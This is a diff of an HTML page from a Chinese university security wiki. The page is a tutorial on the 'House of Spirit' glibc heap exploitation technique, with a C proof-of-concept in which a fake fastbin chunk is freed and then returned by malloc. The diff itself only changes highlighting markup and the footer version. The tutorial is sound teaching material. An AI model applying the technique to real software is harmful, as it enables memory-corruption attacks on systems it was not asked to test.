@@ -10,7 +10,6 @@
 <meta property="og:url" content="/posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A86-house-of-spirit/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-02-05T15:36:08+08:00" />
 <meta property="article:modified_time" content="2023-02-05T15:36:08+08:00" /><meta property="og:site_name" content="湖南大学安全Wiki" />
-
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="heap利用 6/9: House of Spirit"/>
 <meta name="twitter:description" content="1. 概述 House of Spirit 与其他攻击稍有不同，表现为攻击者是在chunk被free之前覆盖现有指针。具体方法是：攻击者创建一个 fake chunk，它可以驻留在内"/>
@@ -86,36 +85,36 @@
             </div><div class="content" id="content"><h2 id="1-概述">1. 概述</h2>
 <p>House of Spirit 与其他攻击稍有不同，表现为攻击者是在chunk被free之前覆盖现有指针。具体方法是：攻击者创建一个 fake chunk，它可以驻留在内存中的任何位置（堆，堆栈等），通过重写chunk指针指向fake chunk，从而达到分配一个任意地址的chunk的目的。此外，必须对fake chunk进行合适的设置以便通过所有安全检查。这种设置并不困难，只需设置好fake chunk和其下一个chunk的<code>size</code>位。当fake chunk被free后，它会被插入到一个合适的bin链表（最可能是fastbin）中。未来对该大小的<code>malloc</code>调用将返回攻击者构造的fake chunk。最终结果类似于前面描述的&quot;forging chunks attack&quot;。</p>
 <h2 id="2-示例程序完整代码httpsgithubcomdhavalkapilheap-exploitationblobd778318b6a14edad18b20421f5a06fa1a6e6920eassetsfileshouse_of_spiritc">2. 示例程序[<a href="https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/house_of_spirit.c" target="_blank" rel="noopener noreffer ">完整代码</a>]</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">fast_chunk</span> <span class="p">{</span>
-  <span class="n">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
-  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
-  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
-  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>                   <span class="c1">// chunk falls in fastbin size range
-</span><span class="c1"></span><span class="p">};</span>
-
-<span class="k">struct</span> <span class="n">fast_chunk</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>   <span class="c1">// Two chunks in consecutive memory
-</span><span class="c1">// fake_chunks[0] at 0x7ffe220c5ca0
-</span><span class="c1">// fake_chunks[1] at 0x7ffe220c5ce0
-</span><span class="c1"></span>
-<span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>
-
-<span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>                 <span class="c1">// First malloc
-</span><span class="c1"></span>
-<span class="c1">// Passes size check of &#34;free(): invalid size&#34;
-</span><span class="c1"></span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fast_chunk</span><span class="p">);</span> 
-
-<span class="c1">// Passes &#34;free(): invalid next size (fast)&#34;
-</span><span class="c1"></span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fast_chunk</span><span class="p">);</span>  
-
-<span class="c1">// Attacker overwrites a pointer that is about to be &#39;freed&#39;
-</span><span class="c1"></span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">fd</span><span class="p">;</span>
-
-<span class="c1">// fake_chunks[0] gets inserted into fastbin
-</span><span class="c1"></span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
-
-<span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>              <span class="c1">//  address returned from malloc
-</span></code></pre></div><p>运行上述程序并查看fake_chunk[0]、fake_chunk[1]和victim的地址可以看到：
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">fast_chunk</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>                   <span class="c1">// chunk falls in fastbin size range
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">fast_chunk</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>   <span class="c1">// Two chunks in consecutive memory
+</span></span></span><span class="line"><span class="cl"><span class="c1">// fake_chunks[0] at 0x7ffe220c5ca0
+</span></span></span><span class="line"><span class="cl"><span class="c1">// fake_chunks[1] at 0x7ffe220c5ce0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ptr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>                 <span class="c1">// First malloc
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Passes size check of &#34;free(): invalid size&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fast_chunk</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Passes &#34;free(): invalid next size (fast)&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fast_chunk</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Attacker overwrites a pointer that is about to be &#39;freed&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// fake_chunks[0] gets inserted into fastbin
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">victim</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>              <span class="c1">//  address returned from malloc
+</span></span></span></code></pre></div><p>运行上述程序并查看fake_chunk[0]、fake_chunk[1]和victim的地址可以看到：
 <img
         class="lazyload"
         src="../../../svg/loading.min.svg"
@@ -152,7 +151,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.118.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="../../../" target="_blank">admin</a></span></div>
         </div>
     </footer></div>
